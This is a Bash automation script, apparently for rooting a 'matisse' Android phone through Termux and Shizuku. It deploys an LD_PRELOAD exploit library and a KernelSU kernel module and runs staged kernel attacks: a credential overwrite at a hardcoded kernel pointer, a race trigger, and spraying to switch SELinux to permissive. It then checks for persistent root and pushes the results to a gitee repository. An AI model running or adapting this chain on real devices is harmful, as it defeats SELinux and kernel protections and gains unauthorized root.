#!/data/data/com.termux/files/usr/bin/bash
# ============================================================
# matisse KSU 一键狩猎脚本 v5 (架构 = 对面 field_auto.sh + KSU 序列)
# 用法: Termux 里 `bash ~/ksu_hunt.sh` — 零判断全自动, 卡片式汇报
# 序列: 部署(SHA门) → 取证 → 体检 → R → E5v3 → C(+KO) → E5R → 回收回传
# 判据: ksu_done.txt / root_alive.txt / uname -n=glroot / ROOT-SEEN euid=0
# ============================================================
set -u
TOKEN=$(cat "$HOME/.matisse_token" 2>/dev/null | tr -d ' \r\n' || true)
REPO_URL="https://ihamn:${TOKEN}@gitee.com/ihamn/matisse.git"
[ -n "$TOKEN" ] || REPO_URL="https://gitee.com/ihamn/matisse.git"
WORK="$HOME/matisse"
RUN_TS=$(date +%Y%m%d_%H%M%S)
CONSOLE_LOG="$HOME/ksu_console_${RUN_TS}.log"
PUSHED=0; EXTRA=""
command -v termux-wake-lock >/dev/null 2>&1 && termux-wake-lock 2>/dev/null
exec > >(tee -a "$CONSOLE_LOG") 2>&1
say(){ echo "[hunt] $*"; }
SHIZUKU_HINT="!! Shizuku 连接不稳: 设置->应用->Termux和Shizuku->省电策略[无限制], 插电+亮屏, 重跑本脚本"

# ── 0. git/仓库 ──
say "第0步: 仓库"
command -v git >/dev/null 2>&1 || pkg install -y git >/dev/null 2>&1
[ -d "$WORK/.git" ] || git clone -q "$REPO_URL" "$WORK" || { say "克隆失败"; exit 1; }
cd "$WORK" || exit 1
git config user.name "field-termux"; git config user.email "field@termux.local"
git pull -q --rebase origin master 2>/dev/null || true
say "仓库: $(git log --oneline -1 | cut -c1-60)"

# ── 1. rish 探测 + 模式 + 重试封装 ──
say "第1步: rish"
RISH=""
for c in "$HOME/rish" "$HOME/rish/rish" "/sdcard/Download/rish" "/storage/emulated/0/Download/rish" "/data/local/tmp/rish"; do
  [ -f "$c" ] && RISH="$c" && break
done
[ -z "$RISH" ] && RISH=$(find "$HOME" -maxdepth 3 -name rish -type f 2>/dev/null | head -1)
[ -z "$RISH" ] && { say "!! 没找到 rish (Shizuku app→复制 rish→~/)"; exit 2; }
RISH_DIR=$(dirname "$RISH"); chmod +x "$RISH" 2>/dev/null
RISH_MODE=""; TEST_A=$( (cd "$RISH_DIR" && timeout 30 ./rish "echo RISH_OK_$(id -u)") 2>&1 )
printf '%s' "$TEST_A" | grep -q "RISH_OK_" && RISH_MODE=args && RISH_OUT="$TEST_A"
if [ -z "$RISH_MODE" ]; then
  TEST_B=$( (cd "$RISH_DIR" && echo 'echo RISH_OK_$(id -u)' | timeout 30 ./rish) 2>&1 )
  printf '%s' "$TEST_B" | grep -q "RISH_OK_" && RISH_MODE=stdin && RISH_OUT="$TEST_B"
fi
[ -z "$RISH_MODE" ] && { say "!! rish 不可用 (Shizuku 没在运行?) 输出: $TEST_A"; exit 2; }
say "rish 模式=$RISH_MODE 身份: $(printf '%s' "$RISH_OUT" | tr '\n' ' ')"
rsh1(){ local cmd="$1" t="${2:-60}"
  if [ "$RISH_MODE" = args ]; then (cd "$RISH_DIR" && timeout "$t" ./rish "$cmd") 2>&1
  else printf '%s\n' "$cmd" | (cd "$RISH_DIR" && timeout "$t" ./rish) 2>&1; fi; }
rsh(){ local cmd="$1" t="${2:-60}" out i
  for i in 1 2 3 4; do
    out=$(rsh1 "$cmd" "$t")
    printf '%s' "$out" | grep -q "Request timeout\|blocked by your system" || { printf '%s\n' "$out"; return 0; }
    [ "$i" -lt 4 ] && say "Shizuku 闪断(第${i}次), 8s 重试..." >&2
    sleep 8
  done; printf '%s\n' "$out"; return 1; }
rpush(){ local l="$1" r="$2" out i
  for i in 1 2 3 4; do
    if [ "$RISH_MODE" = args ]; then out=$( (cd "$RISH_DIR" && timeout 180 ./rish "cat > '$r'") < "$l" 2>&1 )
    else out=$( { echo "cat > '$r'"; cat "$l"; } | (cd "$RISH_DIR" && timeout 180 ./rish) 2>&1 ); fi
    printf '%s' "$out" | grep -q "Request timeout\|blocked by your system" || { printf '%s\n' "$out"; return 0; }
    [ "$i" -lt 4 ] && say "推送闪断(第${i}次), 8s 重试..." >&2
    sleep 8
  done; printf '%s\n' "$out"; return 1; }

# ── 2. 部署 mt85 (SHA 门) + matisse ko ──
say "第2步: 部署 mt85 + matisse kernelsu.ko"
[ -f "$WORK/bin/mt85/preload.so" ] || { say "!! 无 bin/mt85/preload.so"; exit 3; }
SHA_EXP=$(grep -ao '[0-9a-f]\{64\}' "$WORK/bin/mt85/BUILD_INFO.txt" 2>/dev/null | head -1)
rpush "$WORK/bin/mt85/preload.so" "/data/local/tmp/preload.new" >/dev/null
rsh "mv -f /data/local/tmp/preload.new /data/local/tmp/preload.so; chmod 644 /data/local/tmp/preload.so" 30 >/dev/null
rpush "$WORK/kernelsu_prep/kernelsu_matisse_built.ko" "/data/local/tmp/kernelsu_matisse.ko" >/dev/null
rsh "chmod 644 /data/local/tmp/kernelsu_matisse.ko" 20 >/dev/null
SHA_GOT=$(rsh "sha256sum /data/local/tmp/preload.so" 30 | tr -d '\r' | awk '{print $1}')
say "SHA 期望=${SHA_EXP:0:16}... 实际=${SHA_GOT:0:16}..."
if [ -n "$SHA_EXP" ] && [ "$SHA_GOT" != "$SHA_EXP" ]; then
  case "$SHA_GOT" in *timeout*|*blocked*) say "$SHIZUKU_DEAD_HINT";; *) say "!! SHA 不一致, 中止";; esac
  exit 3
fi
say "二进制校验通过 (mt85: KO fd 预开 + 20min gate)"

# ── 3. 取证 (零开火): 残留 → 请求重启 ──
say "第3步: 取证"
FORENSIC="$WORK/logs_raw/hunt_forensic_${RUN_TS}.txt"
{ rsh "date; cat /proc/sys/kernel/random/boot_id; getenforce; cat /proc/loadavg; cat /proc/uptime"
  echo "--- residue ---"
  rsh 'for p in $(pgrep -x sleep 2>/dev/null); do echo "== pid $p =="; for t in /proc/$p/task/*; do echo "tid=$(basename $t) st=$(cut -d" " -f3 $t/stat 2>/dev/null) wchan=$(cat $t/wchan 2>/dev/null)"; done; done' 60
} > "$FORENSIC" 2>&1
RES=$(grep -c "tid=" "$FORENSIC" 2>/dev/null); STUCK=$(grep -o "state=[DR]" "$FORENSIC" 2>/dev/null | wc -l)
say "取证: 线程=$RES D/R=$STUCK"
if [ "${RES:-0}" -gt 0 ]; then
  say "!! 有残留进程 (D/R=$STUCK) — 请重启手机, 10 分钟后重跑本脚本"
  cp "$CONSOLE_LOG" "$WORK/logs_raw/ksu_console_${RUN_TS}.log" 2>/dev/null
  git add -A >/dev/null 2>&1; git commit -q -m "hunt forensics ${RUN_TS}: residue threads=$RES D/R=$STUCK - reboot requested" >/dev/null 2>&1 || true
  for i in 1 2 3; do git pull -q --rebase origin master 2>/dev/null; git push -q origin master 2>/dev/null && break; sleep 10; done
  exit 5
fi
say "无残留, 继续"

# ── 4. 体检 ──
say "第4步: 体检"
BOOT0=$(rsh "cat /proc/sys/kernel/random/boot_id" 20 | tr -d '\r')
printf '%s' "$BOOT0" | grep -qE '^[0-9a-f]{8}-' || { say "!! BOOT0 非 UUID: Shizuku 不稳, 停"; exit 4; }
ENF0=$(rsh "getenforce" 20 | tr -d '\r')
[ "$ENF0" = "Enforcing" ] || { say "!! enforce=$ENF0 非预期"; exit 4; }
while :; do
  UP=$(rsh "awk '{print int(\$1)}' /proc/uptime" 20 | tr -d '\r')
  case "$UP" in ''|*[!0-9]*) sleep 10; continue;; esac
  [ "$UP" -ge 600 ] && break
  say "开机仅 ${UP}s, settle..."; sleep 100
done
LOAD0=$(rsh "cat /proc/loadavg" 20 | tr -d '\r')
say "体检 OK: boot=$(printf '%s' "$BOOT0" | cut -c1-8) enforce=$ENF0 load=$LOAD0 (仅记录)"

# ── 5. 开火机器 ──
cleangate(){ local i
  for i in 1 2 3 4; do
    rsh "pkill -9 -x sleep 2>/dev/null; rm -f /data/local/tmp/mt49_child_status.txt /data/local/tmp/root_alive.txt /data/local/tmp/ksu_done.txt" 20 >/dev/null
    GONE=$(rsh "ls /data/local/tmp/mt49_child_status.txt /data/local/tmp/root_alive.txt 2>/dev/null | wc -l" 20 | tr -d '\r ')
    [ "$GONE" = "0" ] && return 0
    say "门槛文件未删净, 重试 $i..."
  done; return 1; }
fire(){
  local name="$1" kind="$2" task="$3" te="" cmd
  case "$kind" in
    R)  cmd="timeout 250 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/$name.out 2>&1" ;;
    E5) cmd="timeout 250 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_SELINUX_ENF=1 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/$name.out 2>&1" ;;
    C)  cmd="timeout 250 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=C PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 PSELECT_KO=/data/local/tmp/kernelsu_matisse.ko PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/$name.out 2>&1" ;;
    E5R) cmd="timeout 250 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_SELINUX_ENF=1 PSELECT_SELINUX_ENF_VALUE=SPRAY1 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/$name.out 2>&1" ;;
  esac
  if [ -n "$task" ]; then
    cmd="$cmd PSELECT_TASK=$task"
  fi
  say "开火 $name (约4-5分钟, 勿动手机, 保持亮屏)..."
  rsh1 "$cmd" 280 | grep -a "RC=" | tail -1
  local ef
  ef=$(rsh "getenforce" 20 | tr -d '\r')
  say "$name 完成 enforce=$ef"
}
gate(){ local st; st=$(rsh "cat /data/local/tmp/mt49_child_status.txt" 30 | tr -d '\r')
  printf '%s' "$st" | grep -q "CapEff=0000000000000000" && { echo "R_MISS"; return; }
  printf '%s' "$st" | grep -q "task=" && { echo "R_LANDED"; return; }
  echo "R_MISS"; }
gettask(){ rsh "cat /data/local/tmp/mt49_child_status.txt" 30 | tr -d '\r' | grep -a '^task=' | tail -1 | cut -d= -f2 | cut -d' ' -f1; }
bootid(){ local out i
  for i in 1 2 3; do
    out=$(rsh "cat /proc/sys/kernel/random/boot_id" 20 | tr -d '\r' | grep -aE '^[0-9a-f]{8}-' | head -1)
    [ -n "$out" ] && { printf '%s\n' "$out"; return 0; }
    [ "$i" -lt 3 ] && sleep 8
  done; echo "READ_FAIL"; return 1; }

# ── 5b. R → E5v3 → C(KO) 链 ──
cleangate || { say "!! 门槛清理失败, 停"; exit 5; }
fire R11 R ""; R11_GATE=$(gate); say "R11: $R11_GATE"
BOOT1=$(bootid)
C_FIRED=0
if [ "$BOOT1" = "READ_FAIL" ]; then
  say "!! boot_id 读不到 — R11 不可信, 停"
elif [ "$R11_GATE" = "R_LANDED" ] && [ "$BOOT1" = "$BOOT0" ]; then
  T=$(gettask); say "R 落地! E5v3 permissive 窗口..."
  fire E51 E5 ""; say "E5 后 enforce=$(rsh 'getenforce' 20 | tr -d '\r')"
  say "C 击 (KO 已武装, permissive 窗口内)..."
  fire C1 C "$T"; C_FIRED=1
  KO=$(rsh "ls /data/local/tmp/ksu_done.txt 2>/dev/null; grep -c ksu /proc/modules 2>/dev/null" 20 | tr -d '\r')
  say "KO 检查: $KO"
  E5R_NEEDED=$(rsh "getenforce" 20 | tr -d '\r')
  if [ "$E5R_NEEDED" = "Permissive" ]; then fire E5R1 E5R ""; say "E5R: enforce=$(rsh 'getenforce' 20 | tr -d '\r')"; fi
else
  say "R MISS, 重掷 R12"
  fire R12 R ""; R12_GATE=$(gate); say "R12: $R12_GATE"
  BOOT2=$(bootid)
  if [ "$R12_GATE" = "R_LANDED" ] && [ "$BOOT2" = "$BOOT0" ]; then
    T=$(gettask); say "R12 落地! E5v3 → C..."
    fire E52 E5 ""; fire C1 C "$T"; C_FIRED=1
    E5R_NEEDED=$(rsh "getenforce" 20 | tr -d '\r')
    [ "$E5R_NEEDED" = "Permissive" ] && { fire E5R1 E5R ""; say "E5R 还原完成"; }
  else
    say "两轮未中, 停 (本 boot 换新 boot 后重跑)"
  fi
fi

# ── 6. 回收 + 判据 + 回传 ──
say "第6步: 回收"
mkdir -p "$WORK/logs_raw/ksu_hunt_$RUN_TS"
for n in R11 R12 E51 E52 C1 E5R1; do
  rsh "cat /data/local/tmp/$n.out" 90 > "$WORK/logs_raw/ksu_hunt_$RUN_TS/${n}_raw.out" 2>/dev/null
  [ -s "$WORK/logs_raw/ksu_hunt_$RUN_TS/${n}_raw.out" ] || rm -f "$WORK/logs_raw/ksu_hunt_$RUN_TS/${n}_raw.out"
done
rsh "cat /data/local/tmp/root_alive.txt" 20 > "$WORK/logs_raw/ksu_hunt_$RUN_TS/root_alive.txt" 2>/dev/null
rsh "cat /data/local/tmp/ksu_done.txt" 20 > "$WORK/logs_raw/ksu_hunt_$RUN_TS/ksu_done.txt" 2>/dev/null
KSU_MOD=$(rsh "grep -c ksu /proc/modules" 20 | tr -d '\r ')
ROOT_ALIVE=$([ -s "$WORK/logs_raw/ksu_hunt_$RUN_TS/root_alive.txt" ] && echo YES || echo no)
KSU_DONE=$([ -s "$WORK/logs_raw/ksu_hunt_$RUN_TS/ksu_done.txt" ] && echo YES || echo no)
HN=$(rsh "uname -n" 20 | tr -d '\r')
ROOT_SEEN=$(grep -ah "ROOT-SEEN.*euid=0" "$WORK/logs_raw/ksu_hunt_$RUN_TS/"*.out 2>/dev/null | head -1)
{ echo "# KSU HUNT 卡 ${RUN_TS}"
  echo "- R11: $R11_GATE / C: $C_FIRED / $EXTRA"
  echo "- 判据: ksu模块=$KSU_MOD root_alive=$ROOT_ALIVE ksu_done=$KSU_DONE hostname=$HN"
  echo "- ROOT-SEEN euid=0: ${ROOT_SEEN:-无}"
  echo "- 终局活体: $(rsh 'getenforce; uname -n' 20 | tr -d '\r' | tr '\n' ' ')"
} > "$WORK/logs_raw/ksu_hunt_$RUN_TS/CARD.md"
cp "$CONSOLE_LOG" "$WORK/logs_raw/ksu_console_${RUN_TS}.log" 2>/dev/null
git add -A >/dev/null 2>&1
git commit -q -m "KSU hunt ${RUN_TS}: R11=$R11_GATE C=$C_FIRED ksu_mod=$KSU_MOD root_alive=$ROOT_ALIVE ksu_done=$KSU_DONE host=$HN" || true
for i in 1 2 3; do git pull -q --rebase origin master 2>/dev/null; git push -q origin master 2>/dev/null && { PUSHED=1; break; }; sleep 10; done
command -v termux-wake-unlock >/dev/null 2>&1 && termux-wake-unlock 2>/dev/null
say "=========================================="
say "终局: R11=$R11_GATE | C=$C_FIRED | ksu模块=$KSU_MOD | root_alive=$ROOT_ALIVE | ksu_done=$KSU_DONE | host=$HN"
[ "$KSU_MOD" -ge 1 ] 2>/dev/null && say "★★★ KSU 持久 root 完成 ★★★"
[ "$ROOT_ALIVE" = "YES" ] && say "★★★ ROOT-ALIVE 证据落盘 ★★★"
[ "$PUSHED" = 1 ] && say "全部数据已推回 gitee" || say "推送失败! 发 $CONSOLE_LOG 给分析侧"
